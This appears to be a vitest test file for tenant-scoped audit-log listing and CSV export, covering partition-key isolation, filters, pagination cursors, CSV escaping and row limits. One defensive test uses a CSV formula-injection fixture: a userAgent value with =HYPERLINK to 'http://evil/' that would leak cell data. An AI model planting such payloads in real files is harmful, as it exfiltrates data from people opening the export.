import { afterEach, describe, expect, it, vi } from "vitest";
import { DynamoDbAdminAuditLogRepository } from "../../lib/problem-deploy/control-data/admin-audit-log-repository";
import {
  exportTenantAuditCsv,
  listTenantAuditEntries,
} from "../../lib/problem-deploy/handlers/event-handler/audit-log-read";

/**
 * Issue #1292: tenant 越境を物理的に不能にするため、 PK は caller の tenantId 固定。
 * 本 test は PK 固定 + filter / CSV 形式の round-trip を pin する。
 *
 * [Issue #2442 / Phase C4] `listTenantAuditEntries` / `exportTenantAuditCsv` now take a
 * `{ repository }` dep instead of `{ ddb, auditTableName }`. Tests wrap the same fake `send` mock
 * in a real `DynamoDbAdminAuditLogRepository` so the DDB command assertions below stay
 * byte-identical (the repository's `listPage` / `listAllByPartition` are verbatim relocations of
 * the pre-seam inline Query).
 */

afterEach(() => vi.clearAllMocks());

function buildMock(items: Array<Record<string, unknown>>, last?: Record<string, unknown>) {
  const send = vi.fn().mockResolvedValueOnce({
    Items: items,
    ...(last ? { LastEvaluatedKey: last } : {}),
  });
  const repository = new DynamoDbAdminAuditLogRepository({ send } as never, "T");
  return { repository, send };
}

describe("listTenantAuditEntries (#1292)", () => {
  it("should Query with PK=TENANT#<tenantId> fixed from caller", async () => {
    const { repository, send } = buildMock([
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#01HX",
        actor: "u-1",
        action: "create_event",
        outcome: "success",
        occurredAt: "2026-05-20T12:00:00.000Z",
      },
    ]);
    const out = await listTenantAuditEntries({ repository }, { tenantId: "t-1" });
    expect(out.items.length).toBe(1);
    const cmd = send.mock.calls[0]?.[0] as { input?: Record<string, unknown> };
    expect((cmd.input?.ExpressionAttributeValues as Record<string, unknown>)?.[":pk"]).toBe(
      "TENANT#t-1",
    );
    expect(cmd.input?.ScanIndexForward).toBe(false);
  });

  it("should apply from / to / action / principal filters client-side", async () => {
    const { repository } = buildMock([
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#A",
        actor: "u-1",
        action: "create_event",
        outcome: "success",
        occurredAt: "2026-05-20T12:00:00.000Z",
      },
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#B",
        actor: "u-2",
        action: "delete_event",
        outcome: "success",
        occurredAt: "2026-05-21T12:00:00.000Z",
      },
    ]);
    const out = await listTenantAuditEntries(
      { repository },
      {
        tenantId: "t-1",
        from: "2026-05-21T00:00:00.000Z",
        action: "delete_event",
        principal: "u-2",
      },
    );
    expect(out.items.map((i) => i.action)).toEqual(["delete_event"]);
  });

  // #2954: machine actor は `m2m:<clientId>` で client id が発行のたびに変わる。完全一致だけだと
  // 「machine が起こした操作を全部見る」ができないため、末尾 `*` を prefix 一致にした。
  it("should treat a trailing * in principal as a prefix match (so m2m:* selects every machine actor)", async () => {
    const { repository } = buildMock([
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#A",
        actor: "m2m:client-a",
        action: "deploy_problem",
        outcome: "success",
        occurredAt: "2026-05-20T12:00:00.000Z",
      },
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#B",
        actor: "m2m:client-b",
        action: "deploy_problem",
        outcome: "forbidden",
        occurredAt: "2026-05-21T12:00:00.000Z",
      },
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#C",
        actor: "cognito-sub-1",
        actorUsername: "operator@example.com",
        action: "deploy_problem",
        outcome: "success",
        occurredAt: "2026-05-22T12:00:00.000Z",
      },
    ]);
    const out = await listTenantAuditEntries(
      { repository },
      { tenantId: "t-1", principal: "m2m:*" },
    );
    expect(out.items.map((i) => i.actor)).toEqual(["m2m:client-a", "m2m:client-b"]);
  });

  it("should keep principal an exact match when it has no trailing * (human path unchanged)", async () => {
    const { repository } = buildMock([
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#A",
        actor: "m2m:client-a",
        action: "deploy_problem",
        outcome: "success",
        occurredAt: "2026-05-20T12:00:00.000Z",
      },
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#B",
        actor: "m2m:client-ab",
        action: "deploy_problem",
        outcome: "success",
        occurredAt: "2026-05-21T12:00:00.000Z",
      },
    ]);
    const out = await listTenantAuditEntries(
      { repository },
      { tenantId: "t-1", principal: "m2m:client-a" },
    );
    expect(out.items.map((i) => i.actor)).toEqual(["m2m:client-a"]);
  });

  it("should propagate base64 nextCursor when LastEvaluatedKey is returned", async () => {
    const lastKey = { PK: "TENANT#t-1", SK: "AUDIT#01HX" };
    const { repository } = buildMock([], lastKey);
    const out = await listTenantAuditEntries({ repository }, { tenantId: "t-1" });
    expect(out.nextCursor).toBe(Buffer.from(JSON.stringify(lastKey)).toString("base64"));
  });

  it("should decode a base64 cursor into ExclusiveStartKey for the next page", async () => {
    const startKey = { PK: "TENANT#t-1", SK: "AUDIT#01HX" };
    const cursor = Buffer.from(JSON.stringify(startKey)).toString("base64");
    const { repository, send } = buildMock([]);
    await listTenantAuditEntries({ repository }, { tenantId: "t-1", cursor });
    const cmd = send.mock.calls[0]?.[0] as { input?: Record<string, unknown> };
    expect(cmd.input?.ExclusiveStartKey).toEqual(startKey);
  });

  it("should ignore a malformed cursor and query from the start", async () => {
    // valid base64 but the decoded bytes are not JSON → decode falls back to undefined.
    const cursor = Buffer.from("not json at all", "utf-8").toString("base64");
    const { repository, send } = buildMock([]);
    await listTenantAuditEntries({ repository }, { tenantId: "t-1", cursor });
    const cmd = send.mock.calls[0]?.[0] as { input?: Record<string, unknown> };
    expect(cmd.input?.ExclusiveStartKey).toBeUndefined();
  });
});

describe("exportTenantAuditCsv (#1292)", () => {
  it("should produce CSV with a header row and escape special characters", async () => {
    // 2 pages: 1st has 1 row + LastEvaluatedKey, 2nd has 1 row + no key
    const send = vi
      .fn()
      .mockResolvedValueOnce({
        Items: [
          {
            PK: "TENANT#t-1",
            SK: "AUDIT#A",
            actor: "u-1",
            actorUsername: "alice@example.com",
            action: "create_event",
            outcome: "success",
            target: 'has "quote", and comma',
            occurredAt: "2026-05-20T12:00:00.000Z",
          },
        ],
        LastEvaluatedKey: { PK: "TENANT#t-1", SK: "AUDIT#A" },
      })
      .mockResolvedValueOnce({
        Items: [
          {
            PK: "TENANT#t-1",
            SK: "AUDIT#B",
            actor: "u-2",
            action: "delete_event",
            outcome: "forbidden",
            occurredAt: "2026-05-21T12:00:00.000Z",
          },
        ],
      });
    const repository = new DynamoDbAdminAuditLogRepository({ send } as never, "T");
    const csv = await exportTenantAuditCsv({ repository }, { tenantId: "t-1" });
    const lines = csv.trim().split("\n");
    expect(lines[0]).toBe(
      "occurredAt,tenantId,actor,actorUsername,action,outcome,target,ipAddress,userAgent",
    );
    expect(lines[1]).toContain('"has ""quote"", and comma"');
    expect(lines[2]).toContain("delete_event");
    expect(send).toHaveBeenCalledTimes(2);
  });

  it("should drain every page following LastEvaluatedKey with PK fixed + ScanIndexForward=false", async () => {
    const row = (sk: string) => ({
      PK: "TENANT#t-1",
      SK: `AUDIT#${sk}`,
      actor: "u",
      action: "x",
      outcome: "success",
      occurredAt: `2026-05-20T12:00:00.00${sk}Z`,
    });
    const send = vi
      .fn()
      .mockResolvedValueOnce({
        Items: [row("A")],
        LastEvaluatedKey: { PK: "TENANT#t-1", SK: "k1" },
      })
      .mockResolvedValueOnce({
        Items: [row("B")],
        LastEvaluatedKey: { PK: "TENANT#t-1", SK: "k2" },
      })
      .mockResolvedValueOnce({ Items: [row("C")] });
    const repository = new DynamoDbAdminAuditLogRepository({ send } as never, "T");
    const csv = await exportTenantAuditCsv({ repository }, { tenantId: "t-1" });
    // 3 ページ全て drain。
    expect(send).toHaveBeenCalledTimes(3);
    expect(csv.trim().split("\n").length).toBe(4); // header + 3 rows
    const first = send.mock.calls[0]?.[0] as { input?: Record<string, unknown> };
    expect((first.input?.ExpressionAttributeValues as Record<string, unknown>)?.[":pk"]).toBe(
      "TENANT#t-1",
    );
    expect(first.input?.ScanIndexForward).toBe(false);
    expect(first.input?.ExclusiveStartKey).toBeUndefined();
    // 2 / 3 ページ目の ExclusiveStartKey は直前ページの LastEvaluatedKey を引き継ぐ。
    const second = send.mock.calls[1]?.[0] as { input?: Record<string, unknown> };
    expect(second.input?.ExclusiveStartKey).toEqual({ PK: "TENANT#t-1", SK: "k1" });
    const third = send.mock.calls[2]?.[0] as { input?: Record<string, unknown> };
    expect(third.input?.ExclusiveStartKey).toEqual({ PK: "TENANT#t-1", SK: "k2" });
  });

  it("#1388: should neutralize a formula-injection payload from the userAgent header", async () => {
    const send = vi.fn().mockResolvedValueOnce({
      Items: [
        {
          PK: "TENANT#t-1",
          SK: "AUDIT#A",
          actor: "u-1",
          action: "create_event",
          outcome: "success",
          // userAgent は request header 由来 (= 攻撃者制御)。 =HYPERLINK は Excel で実行される。
          userAgent: '=HYPERLINK("http://evil/?c="&A1,"open")',
          occurredAt: "2026-05-20T12:00:00.000Z",
        },
      ],
    });
    const repository = new DynamoDbAdminAuditLogRepository({ send } as never, "T");
    const csv = await exportTenantAuditCsv({ repository }, { tenantId: "t-1" });
    // 先頭 = は single quote で無害化され、 quote で囲まれる (= cell として実行されない)。
    expect(csv).toContain('"\'=HYPERLINK(""http://evil/?c=""&A1,""open"")"');
    // 生の "=HYPERLINK( が行頭に来ない (= formula として解釈されない)。
    expect(csv).not.toMatch(/,=HYPERLINK\(/);
  });

  it("should respect maxRows truncation", async () => {
    const send = vi.fn().mockResolvedValueOnce({
      Items: Array.from({ length: 50 }, (_, i) => ({
        PK: "TENANT#t-1",
        SK: `AUDIT#${i}`,
        actor: "u",
        action: "x",
        outcome: "success",
        occurredAt: `2026-05-20T12:00:${String(i).padStart(2, "0")}.000Z`,
      })),
    });
    const repository = new DynamoDbAdminAuditLogRepository({ send } as never, "T");
    const csv = await exportTenantAuditCsv({ repository }, { tenantId: "t-1" }, { maxRows: 5 });
    // header + 5 data rows + trailing newline = 6 lines + 1 trailing empty
    expect(csv.trim().split("\n").length).toBe(6);
  });
});
